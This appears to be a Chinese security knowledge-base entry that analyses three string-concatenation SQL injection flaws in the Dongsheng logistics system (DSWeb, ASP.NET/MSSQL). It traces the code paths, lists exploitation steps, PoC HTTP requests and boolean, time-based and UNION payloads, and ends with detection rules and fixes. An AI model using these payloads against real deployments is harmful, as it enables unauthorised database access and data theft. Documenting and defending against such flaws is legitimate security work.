---
id: web-generic-sqli-dongsheng-logistics-multi-entry-concat
title: 东胜物流系统三处 SQL 注入：modulename/optype/attrid 参数直拼 MSSQL
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-mvc-webform-param-concat-sqli
tags:
- sqli
- dotnet
- aspnet
- mvc
- webforms
- mssql
- string-concat
- code-audit
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V191
  verified_at: '2026-11-06T23:16:16+08:00'
  notes: 已对照原文与12张图核对：GetUserModuleEnable(modulename→sys_module拼接)、GetFeeOpRang/GetRangDASQLStr(optype→where [NAME]拼接)、AttributeAdapter Page_Load的handle/attrid→GetAttributeInfo中AND A.GID拼接并string.Format执行，三处调用链与代码截图一致；userid来自Session已注明；MSSQL方括号标识符判断合理；原文无实测HTTP请求，confidence medium 合理
url: /docs/web/generic/sqli/web-generic-sqli-dongsheng-logistics-multi-entry-concat/
draft: false
kb_aliases:
- 东胜物流 SQL 注入
- GetUserModuleEnable 注入
- GetFeeOpRang 注入
- AttributeAdapter 注入
- modulename 注入
- optype 注入
- attrid 注入
---

## 一句话结论

东胜物流系统（DSWeb，ASP.NET MVC 与 WebForms 混合）有三处把请求参数直接用字符串拼接进 SQL Server 语句的注入点：`MsBaseInfoController.GetUserModuleEnable` 的 `modulename`、`GetFeeOpRang` 经 `MsChFeeDAL.GetRangDASQLStr` 的 `optype`、WebForms 页 `AttributeAdapter.aspx` 的 `attrid`；闭合单引号即可改写 WHERE 条件，做布尔盲注、时间盲注或按列数 UNION 取数。

## 原理

三处是同一种危险模式：请求参数进入 Controller/Page → BLL/DAL 用 `StringBuilder.Append`、`string.Concat` 或 `string.Format` 拼成 SQL 文本 → `DatabaseFactory.CreateDatabase().ExecuteReader(CommandType.Text, sql)` 或 `GetExecuteSql(sql)` 直接执行，全程没有 `SqlParameter`、没有转义单引号、没有先做类型转换。

1. `MsBaseInfoController.GetUserModuleEnable(string modulename)` 把 `modulename` 传给 `MsBaseInfoDAL.GetUserModuleEnable(modulename, Session["USERID"])`；DAL 拼出 `SELECT count(GID) as count FROM sys_module WHERE [NAME]='<modulename>' AND GID IN (SELECT B.MODULEID FROM user_action ... WHERE USERID='<userid>')`。`modulename` 位于单引号字符串上下文，`x' OR 1=1--` 可把条件改成恒真；结果只用于 `Convert.ToInt32(reader["count"]) > 0` 的布尔判断，适合布尔盲注。
2. `GetFeeOpRang(string optype)` 调用 `MsChFeeDAL.GetFeeOpRang(optype, userid)`，再进入 `GetRangDASQLStr(string tb, string userid)`：`where [NAME]='<tb>' and USERID='<userid>' and ISDELETE=0`，`tb` 就是 optype。查询结果被映射为 `List<OPCODE>`（`OPID = reader["OPCODE"]`）并返回 JSON 的 `data`，列数/类型匹配时可用 UNION 直接回显。
3. `AttributeAdapter` 页面在 `Page_Load` 读取 `Request.QueryString["handle"]`，等于 `attrinfo` 时调用 `GetAttributeInfo()`；后者把 `Request.QueryString["attrid"]` 存入 `strAttributeID`，拼成 `tempAttrSql = " AND A.GID = '<attrid>'"`，再用 `string.Format("{0} {1} {2}", "SELECT A.GID, A.NAME, ... FROM attribute a INNER JOIN attribute_type as B ON A.TYPEID = B.GID WHERE 1 > 0", tempAttrSql, " ORDER BY A.DESCRIPTION ASC")` 交给 `attributeCompanyDA.GetExecuteSql`。`attrid` 可控且同样处于单引号上下文。

为什么成立：SQL 解析发生在字符串拼接之后，数据库看到的是包含攻击者语法的完整语句；单引号闭合使 `[NAME]='...'` 的边界失效，`--`/`/* */` 注释掉余下条件；SQL Server 的 `WAITFOR DELAY`、`@@VERSION`、`UNION SELECT` 分别支撑时间盲注、报错/版本判断和联合取数。三处都把参数当“SQL 语法”而非“数据”处理，这是根因。

## 触发条件

- 目标部署东胜物流系统（`DSWeb` 程序集，MVC 路由 `{controller}/{action}/{id}` 与 WebForms 页共存）。
- `MsBaseInfo/GetUserModuleEnable`、`MsBaseInfo/GetFeeOpRang`、`AttributeAdapter.aspx` 三个入口可达，且 `modulename`、`optype`、`attrid` 未在外层过滤。
- 数据库为 SQL Server 系列（代码使用 `[NAME]`/`[action]` 方括号标识符、`VW_User_Authority` 视图与 `CommandType.Text`；未见参数化）。
- 入口是否需要登录、是否有 WAF 未验证；鉴权分析部分只列出了路由注册，没有给出未授权结论。

## 利用步骤

1. 先请求正常值确认入口：`GET /MsBaseInfo/GetUserModuleEnable?modulename=<已知模块名>`，观察返回的布尔/列表差异。
2. 用 `modulename=x' OR 1=1--` 与 `modulename=x' AND 1=2--` 对比返回；若布尔差异明显，进入布尔盲注逐字符取 `DB_NAME()`、表名。
3. 对 `GetFeeOpRang` 传 `optype=x' OR 1=1--`，观察 `data` 列表是否变化；列表有回显时按 `OPCODE` 列数构造 `UNION SELECT` 取数据。
4. 对 `AttributeAdapter.aspx?handle=attrinfo&attrid=1' OR 1=1--` 观察返回的 `<attr>` XML；该页面把查询结果拼成 XML 输出，列数匹配时优先尝试 UNION。
5. 无回显或布尔差异不稳定时用时间盲注：`modulename=x'; IF(DB_NAME()='master') WAITFOR DELAY '0:0:5'--`，比较响应时间。
6. 拿到库名后按 `sys_module`、`user_action`、`attribute`、`attribute_type` 等表逐步取管理员/用户数据；注意 `userid` 来自 Session，不是注入点。

## PoC

> 以下路径按 MVC 默认路由推断，payload 依据拼接代码构造；未给出实测请求/响应，需按目标实际路由调整。

```http
### 1) modulename 布尔盲注
GET /MsBaseInfo/GetUserModuleEnable?modulename=x'%20OR%201=1-- HTTP/1.1
Host: target

### 2) optype 注入（列表回显）
GET /MsBaseInfo/GetFeeOpRang?optype=x'%20OR%201=1-- HTTP/1.1
Host: target

### 3) attrid 注入（XML 回显）
GET /AttributeAdapter.aspx?handle=attrinfo&attrid=1'%20OR%201=1-- HTTP/1.1
Host: target
```

```sql
-- 时间盲注（SQL Server）
modulename=x'; IF(DB_NAME()='master') WAITFOR DELAY '0:0:5'--
-- 报错/版本判断（若异常回显）
modulename=x' AND 1=@@VERSION--
-- UNION 取数（列数需与 attribute 查询匹配）
attrid=1' UNION SELECT ...--
```

## 变体与关联

- 同一系统还有多处同模式注入；审计时按 `Append(... + ...)`、`string.Concat`、`string.Format` 中嵌入 SELECT 的写法批量 grep。
- 与 [[web-generic-sqli-dotnet-handler-mssql-param-concat-version]] 同类：都是 .NET 端参数直拼 MSSQL，区别是本例入口为 MVC Controller/WebForms Page，且 `modulename` 只影响布尔结果。
- 与 [[web-generic-sqli-aspnet-webforms-report-txtwhere-mssql]] 同类：ASP.NET WebForms 页面把查询参数拼进 WHERE，可借鉴其报错/UNION 取数手法。

## 检测与防御

- 代码层：所有 SQL 改用 `SqlParameter`；`modulename` 先做白名单/正则校验，`attrid`/`optype` 先 `int.Parse`/枚举校验；禁止把用户输入拼进 `CommandType.Text`。
- 审计特征：`strSql.Append(" ... '" + param + "'")`、`string.Concat(new string[]{ "...", param, "..." })`、`string.Format("{0} ... {1}", sql, tempSql)` 后直接 `ExecuteReader`/`GetExecuteSql`。
- 运行层：WAF 拦截 `'`、`--`、`/*`、`WAITFOR`、`UNION`、`@@VERSION` 等；数据库账号最小权限，关闭详细 SQL 错误回显。
- 检测：数据库审计日志出现 `[NAME]='x' OR 1=1`、`WAITFOR DELAY`、异常长的 `attrid`；Web 日志中参数含编码后的单引号/注释符。
